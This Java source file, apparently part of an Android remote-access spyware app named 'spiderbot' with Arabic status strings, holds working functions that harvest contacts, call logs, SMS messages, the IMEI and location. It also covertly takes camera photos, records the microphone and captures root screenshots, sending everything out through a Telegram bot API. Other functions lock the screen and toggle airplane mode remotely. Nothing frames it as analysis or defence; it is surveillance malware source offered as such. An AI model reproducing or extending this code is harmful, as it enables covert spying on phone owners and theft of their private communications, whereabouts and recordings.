package com.spiderbot;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.Camera;
import android.hardware.camera2.CameraManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class DeviceUtils {
    
    public static String getContacts(Context ctx) {
        StringBuilder sb = new StringBuilder("📞 *جهات الاتصال:*\n");
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
            if (c != null) {
                int count = 0;
                while (c.moveToNext() && count < 100) {
                    String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append("👤 ").append(name != null ? name : "بدون اسم").append(": ").append(num).append("\n");
                    count++;
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    public static String getCallLog(Context ctx) {
        StringBuilder sb = new StringBuilder("📋 *سجل المكالمات:*\n");
        try {
            Cursor c = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 100");
            if (c != null) {
                while (c.moveToNext()) {
                    String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
                    String name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                    int type = c.getInt(c.getColumnIndex(CallLog.Calls.TYPE));
                    long dur = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
                    long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
                    String typeStr = type == 1 ? "📞 وارد" : type == 2 ? "📤 صادر" : "❌ فائت";
                    String contact = (name != null && !name.isEmpty()) ? name : num;
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                    sb.append(typeStr).append(" ").append(contact).append("\n   📱 ").append(num)
                      .append("\n   ⏱ ").append(dur).append(" ثانية")
                      .append("\n   🕐 ").append(sdf.format(new Date(date))).append("\n\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    public static String getSMS(Context ctx) {
        StringBuilder sb = new StringBuilder("💬 *الرسائل النصية:*\n");
        try {
            Cursor c = ctx.getContentResolver().query(
                Uri.parse("content://sms/"), null, null, null,
                "date DESC LIMIT 50");
            if (c != null) {
                while (c.moveToNext()) {
                    String addr = c.getString(c.getColumnIndex("address"));
                    String body = c.getString(c.getColumnIndex("body"));
                    long date = c.getLong(c.getColumnIndex("date"));
                    int type = c.getInt(c.getColumnIndex("type"));
                    String typeStr = type == 1 ? "📩 وارد" : type == 2 ? "📤 صادر" : "❓ غير معروف";
                    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                    sb.append(typeStr).append(" من: ").append(addr)
                      .append("\n   🕐 ").append(sdf.format(new Date(date)))
                      .append("\n   📝 ").append(body.length() > 100 ? body.substring(0,100)+"..." : body).append("\n\n");
                }
                c.close();
            }
        } catch (Exception e) { sb.append("خطأ: ").append(e.getMessage()); }
        return sb.toString();
    }

    public static String getDeviceInfo(Context ctx) {
        StringBuilder sb = new StringBuilder("📱 *معلومات الجهاز:*\n");
        sb.append("الموديل: ").append(Build.MODEL).append("\n");
        sb.append("الشركة: ").append(Build.MANUFACTURER).append("\n");
        sb.append("أندرويد: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("API: ").append(Build.VERSION.SDK_INT).append("\n");
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ctx.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    sb.append("IMEI: ").append(tm.getImei()).append("\n");
                }
            }
        } catch (Exception ignored) {}
        return sb.toString();
    }

    public static String getBattery(Context ctx) {
        try {
            android.content.IntentFilter filter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
            android.content.Intent battery = ctx.registerReceiver(null, filter);
            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0);
            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100);
            return "🔋 *البطارية:* " + (level * 100 / scale) + "%";
        } catch (Exception e) { return "خطأ: " + e.getMessage(); }
    }

    public static String getWifi(Context ctx) {
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            String ssid = wm.getConnectionInfo().getSSID();
            return "📶 *WiFi:* " + (ssid != null ? ssid : "غير متصل");
        } catch (Exception e) { return "خطأ: " + e.getMessage(); }
    }

    public static void getLocation(Context ctx, LocationCallback cb) {
        try {
            LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) {
                cb.onResult("📍 *الموقع:*\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
            } else {
                cb.onResult("❌ لا يمكن تحديد الموقع");
            }
        } catch (Exception e) { cb.onResult("خطأ: " + e.getMessage()); }
    }
    public interface LocationCallback { void onResult(String result); }

    public static void takePhoto(Context ctx, boolean front, PhotoCallback cb) {
        try {
            int id = front ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
            Camera cam = Camera.open(id);
            cam.takePicture(null, null, (data, camera) -> {
                try {
                    File f = new File(ctx.getCacheDir(), "spider_" + System.currentTimeMillis() + ".jpg");
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(data);
                    fos.close();
                    TelegramAPI.sendFile(f, "📸 صورة" + (front ? " أمامية" : " خلفية"));
                    cb.onResult(f, "تم");
                } catch (Exception e) { cb.onResult(null, e.getMessage()); }
                camera.release();
            });
        } catch (Exception e) { cb.onResult(null, e.getMessage()); }
    }
    public interface PhotoCallback { void onResult(File file, String msg); }

    private static MediaRecorder audioRecorder;
    private static String audioPath;
    
    public static void startRecording(Context ctx) {
        try {
            audioPath = ctx.getCacheDir() + "/audio_" + System.currentTimeMillis() + ".mp4";
            audioRecorder = new MediaRecorder();
            audioRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            audioRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            audioRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            audioRecorder.setOutputFile(audioPath);
            audioRecorder.prepare();
            audioRecorder.start();
            TelegramAPI.sendMessage("🎤 بدأ التسجيل الصوتي");
        } catch (Exception e) { TelegramAPI.sendMessage("❌ فشل التسجيل: " + e.getMessage()); }
    }
    
    public static void stopRecording() {
        try {
            if (audioRecorder != null) {
                audioRecorder.stop();
                audioRecorder.release();
                audioRecorder = null;
                File f = new File(audioPath);
                if (f.exists()) TelegramAPI.sendFile(f, "🎤 تسجيل صوتي");
                TelegramAPI.sendMessage("⏹️ تم إيقاف التسجيل");
            }
        } catch (Exception e) { TelegramAPI.sendMessage("❌ خطأ: " + e.getMessage()); }
    }

    public static void takeScreenshot(Context ctx) {
        try {
            Process p = Runtime.getRuntime().exec("su -c screencap -p /sdcard/spider_screen.png");
            p.waitFor();
            File f = new File("/sdcard/spider_screen.png");
            if (f.exists() && f.length() > 0) {
                TelegramAPI.sendFile(f, "🖥️ لقطة شاشة");
            } else {
                TelegramAPI.sendMessage("❌ فشلت لقطة الشاشة");
            }
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }

    public static void vibrate(Context ctx) {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(2000); TelegramAPI.sendMessage("📳 تم الاهتزاز"); }
        else TelegramAPI.sendMessage("❌ الاهتزاز غير مدعوم");
    }

    public static void lockScreen(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, AdminReceiver.class);
            if (dpm.isAdminActive(admin)) { 
                dpm.lockNow(); 
                TelegramAPI.sendMessage("🔒 تم قفل الشاشة"); 
            } else { 
                TelegramAPI.sendMessage("❌ لم يتم تفعيل مسؤول الجهاز"); 
            }
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }

    private static boolean isFlashOn = false;
    
    public static void toggleFlash(Context ctx) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String id = cm.getCameraIdList()[0];
            isFlashOn = !isFlashOn;
            cm.setTorchMode(id, isFlashOn);
            TelegramAPI.sendMessage(isFlashOn ? "💡 تم تشغيل الفلاش" : "💡 تم إطفاء الفلاش");
        } catch (Exception e) { TelegramAPI.sendMessage("❌ " + e.getMessage()); }
    }

    public static void airplaneMode(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            boolean isEnabled = Settings.Global.getInt(ctx.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 1;
            Settings.Global.putInt(ctx.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, isEnabled ? 0 : 1);
            android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_AIRPLANE_MODE_CHANGED);
            intent.putExtra("state", !isEnabled);
            ctx.sendBroadcast(intent);
            TelegramAPI.sendMessage(isEnabled ? "✈️ إيقاف وضع الطيران" : "✈️ تفعيل وضع الطيران");
        }
    }
    }
